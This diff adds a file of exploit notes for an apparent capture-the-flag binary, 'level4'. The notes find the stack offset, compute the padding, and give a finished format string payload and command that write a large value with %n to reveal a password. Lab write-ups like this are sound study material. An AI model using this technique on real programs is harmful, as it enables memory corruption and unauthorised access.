@@ -1,0 +1,67 @@
+# Large Value Format String Analysis for Level4
+# ===============================================
+
+# Target Information
+# ==================
+TARGET_VARIABLE = "m"
+TARGET_ADDRESS = 0x08049810
+TARGET_VALUE = 0x1025544 (16930116 decimal)
+
+# Format String Vulnerability
+# ============================
+# Vulnerable function: printf(param_1)
+# Input method: fgets(local_20c, 0x200, stdin) -> p(local_20c)
+# Buffer size: 520 bytes
+
+# Stack Layout Discovery
+# ======================
+# Test payload: "AAAA" + "%x "*20
+# Result: 41414141 (AAAA) appears at position 12
+# Our input buffer is accessible via %12$ parameter
+
+# Large Value Write Challenge
+# ===========================
+# Goal: Write 16930116 to address 0x08049810 using %n
+# Problem: Need to print exactly 16930116 characters before %n
+
+# Calculation:
+# - Address bytes: 4
+# - Required total characters: 16930116
+# - Padding needed: 16930116 - 4 = 16930112 characters
+
+# Payload Structure:
+# [target_address (4 bytes)] + [massive_padding] + [%12$n]
+
+# Final Payload:
+EXPLOIT_PAYLOAD = '\x10\x98\x04\x08%16930112x%12$n'
+
+# Payload Breakdown:
+# \x10\x98\x04\x08  = Target address (little-endian)
+# %16930112x        = Print 16930112 hex characters (massive padding)
+# %12$n             = Write character count to 12th parameter
+
+# Execution Characteristics:
+# ==========================
+# - Output size: ~16MB of whitespace
+# - Execution time: Several seconds due to massive output
+# - Memory usage: Significant due to printf buffer
+# - Result: Password displayed at end of output
+
+# Performance Impact:
+# ===================
+# The %16930112x specifier causes printf to:
+# 1. Generate 16930112 space characters
+# 2. Print them to stdout (very slow)
+# 3. Count total characters for %n operation
+# 4. Write final count (16930116) to target address
+
+# Working Exploit Command:
+(python -c "print('\x10\x98\x04\x08%16930112x%12\$n')"; cat) | ./level4
+
+# Expected Output Pattern:
+# [address_bytes][massive_whitespace][hex_value]
+# [password_on_last_line]
+
+# Alternative Optimization (if needed):
+# Could use multiple smaller %n writes to build up the value
+# But single large write is simpler and works fine here
